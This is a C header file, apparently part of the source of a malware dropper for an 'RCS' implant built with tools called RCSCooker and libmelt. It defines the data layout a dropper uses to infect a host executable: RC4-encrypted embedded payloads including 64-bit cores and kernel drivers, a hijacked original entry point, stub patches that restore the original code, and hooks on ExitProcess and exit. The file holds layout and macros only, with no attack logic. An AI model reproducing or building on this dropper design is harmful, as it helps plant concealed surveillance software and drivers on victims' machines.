#ifndef DropperHeader_h__
#define DropperHeader_h__

#include "common.h"

// RC4
enum {
	RC4KEYLEN = 32,
	VERSIONLEN = 32,
};

#define S_SWAP(a,b) do { unsigned char t = S[a]; S[a] = S[b]; S[b] = t; } while(0)
#define RC4_CRYPT(buf, buf_len, key, key_len, header) rc4_skip((unsigned char*)key, key_len, 0, (unsigned char*)buf, buf_len, header)

#ifdef WIN32
#define ALIGN4 __declspec(align(4))
#else
#define ALIGN4 __attribute__((aligned(4)))
#endif

typedef void (*WINSTARTFUNC)(void);

typedef ALIGN4 struct _data_section_blob {
	DWORD offset;
	DWORD size;
} DataSectionBlob;

typedef ALIGN4 struct _patch_blob {
	DWORD VA;
	DWORD offset;
	DWORD size;
} PatchBlob;

typedef ALIGN4 struct _data_section_cryptopack {
	DWORD offset;
	DWORD size;
	DWORD original_size;
	DWORD characteristics;
} DataSectionCryptoPack;

typedef ALIGN4 struct _data_section_files {
	struct {
		DataSectionBlob core;
		DataSectionBlob core64;
		DataSectionBlob config;
		DataSectionBlob driver;
		DataSectionBlob driver64;
		DataSectionBlob codec;
	} names;
	
	DataSectionCryptoPack core;
	DataSectionCryptoPack core64;
	DataSectionCryptoPack config;
	DataSectionCryptoPack driver;
	DataSectionCryptoPack driver64;
	DataSectionCryptoPack codec;
} DataSectionFiles;

#define FLAG_RCSPAYLOAD			0x1
#define FLAG_GENERICPAYLOAD     0x2

//
// *** NOTE: any change to the following header must reflect in changes to:
//       - minor version of RCSCooker
//       - RCSCooker version verification regexp in libmelt
//

typedef ALIGN4 struct _data_section_header {
	// RCSCooker version
	CHAR version[VERSIONLEN];
	
	// Action to be performed ... will be used for generic payload
	DWORD flags;
	
	// RC4 encryption key
	CHAR rc4key[RC4KEYLEN];
	
	// OEP
	WINSTARTFUNC   pfn_OriginalEntryPoint;
	
	// Synchronization
	DWORD synchro;
	
	// used to pass full qualified path to core thread
	CHAR *dllPath;
	
	// used to hook ExitProcess on Vista (Vista deletes call names from Thunks when EXE is loaded)
	struct {
		int ExitProcess;
		int exit;
		int _exit;
	} hookedCalls;
	
	// our own functions
	struct {
		DataSectionBlob entryPoint;
		DataSectionBlob coreThread;
		DataSectionBlob dumpFile;
		DataSectionBlob exitProcessHook;
		DataSectionBlob exitHook;
		DataSectionBlob rvaToOffset;
		DataSectionBlob rc4;
		DataSectionBlob hookCall;
		DataSectionBlob load;
	} functions;					// COOKED

	// strings
	DataSectionBlob stringsOffsets; // COOKED
	DataSectionBlob strings;

	// dlls and addresses
	DataSectionBlob dlls; 			// COOKED
	DataSectionBlob callAddresses;

	// appended files
	DataSectionFiles files;			// COOKED

	// stub code patches to restore original code
	PatchBlob stage1;
	PatchBlob stage2;

	// saves state, jump to dropper and return to OEP
	DataSectionBlob restore;

	// THIS LAST TWO FIELDS MUST NOT BE MOVED!
	DWORD offsetToHeader;
	DWORD headerEndMarker;

} DropperHeader;

#endif // DropperHeader_h__
